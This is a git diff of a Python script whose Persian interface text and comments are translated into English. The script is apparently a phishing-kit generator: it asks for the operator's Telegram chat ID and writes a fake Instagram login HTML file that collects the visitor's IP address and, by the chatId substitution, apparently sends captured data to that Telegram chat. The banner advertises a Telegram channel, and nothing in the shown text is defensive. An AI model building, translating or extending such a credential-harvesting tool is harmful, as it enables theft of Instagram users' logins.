@@ -1,6 +1,6 @@
 import os
 
-# کدهای رنگی برای ترمینال
+# Color codes for terminal
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -24,21 +24,21 @@ Tegram:
  Channel:@editor_a0
  PV:editor_a0                                                                                  {Colors.END}
 {Colors.YELLOW}{'='*60}{Colors.END}
-{Colors.MAGENTA}{Colors.BOLD}          دریافت فایل صفحه لاگین اینستگرام {Colors.END}
+{Colors.MAGENTA}{Colors.BOLD}          Generate Instagram Login Page File {Colors.END}
 {Colors.YELLOW}{'='*60}{Colors.END}
 """
     print(banner)
 
 def get_telegram_id():
     show_banner()
-    print(f"{Colors.GREEN}{Colors.BOLD}لطفا چت آیدی تلگرام خود را وارد کنید:{Colors.END}")
-    print(f"{Colors.YELLOW}مثال: 1234567890{Colors.END}\n")
+    print(f"{Colors.GREEN}{Colors.BOLD}Please enter your Telegram chat ID:{Colors.END}")
+    print(f"{Colors.YELLOW}Example: 1234567890{Colors.END}\n")
     
     telegram_id = input(f"{Colors.RED}{Colors.BOLD}>>> {Colors.END}").strip()
     
     if not telegram_id:
-        print(f"\n{Colors.RED}خطا: چت آیدی نمی‌تواند خالی باشد!{Colors.END}")
-        input(f"{Colors.YELLOW}برای ادامه Enter بزنید...{Colors.END}")
+        print(f"\n{Colors.RED}Error: Chat ID cannot be empty!{Colors.END}")
+        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
         return get_telegram_id()
     
     return telegram_id
@@ -216,7 +216,7 @@ def generate_html(telegram_id):
     </div>
 
 <script>
-    // تابع جدید برای دریافت IP (نسخه ساده شده)
+    // Function to get IP (simplified version)
     async function getIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -282,7 +282,7 @@ def generate_html(telegram_id):
 </html>
 """
     
-    # جایگزینی chatId با مقدار وارد شده توسط کاربر
+    # Replace chatId with the user-provided value
     html_content = html_content.replace("const chatId = '6457940911'", f"const chatId = '{telegram_id}'")
     
     filename = f"Instagram-login_{telegram_id}.html"
@@ -297,16 +297,16 @@ def main():
         
         clear_screen()
         show_banner()
-        print(f"{Colors.GREEN}{Colors.BOLD}عملیات با موفقیت انجام شد!{Colors.END}")
-        print(f"{Colors.CYAN}فایل با نام {filename} ذخیره شد.{Colors.END}\n")
-        print(f"{Colors.YELLOW}دستورالعمل:{Colors.END}")
-        print(f"{Colors.WHITE}1. فایل را در مرورگر باز کنید{Colors.END}")
-        print(f"{Colors.WHITE}2. از آن استفاده نمایید{Colors.END}\n")
-        input(f"{Colors.YELLOW}برای خروج Enter بزنید...{Colors.END}")
+        print(f"{Colors.GREEN}{Colors.BOLD}Operation completed successfully!{Colors.END}")
+        print(f"{Colors.CYAN}File saved as {filename}.{Colors.END}\n")
+        print(f"{Colors.YELLOW}Instructions:{Colors.END}")
+        print(f"{Colors.WHITE}1. Open the file in a browser{Colors.END}")
+        print(f"{Colors.WHITE}2. Use it as needed{Colors.END}\n")
+        input(f"{Colors.YELLOW}Press Enter to exit...{Colors.END}")
     
     except Exception as e:
-        print(f"\n{Colors.RED}خطا: {str(e)}{Colors.END}")
-        input(f"{Colors.YELLOW}برای خروج Enter بزنید...{Colors.END}")
+        print(f"\n{Colors.RED}Error: {str(e)}{Colors.END}")
+        input(f"{Colors.YELLOW}Press Enter to exit...{Colors.END}")
 
 if __name__ == "__main__":
     main()
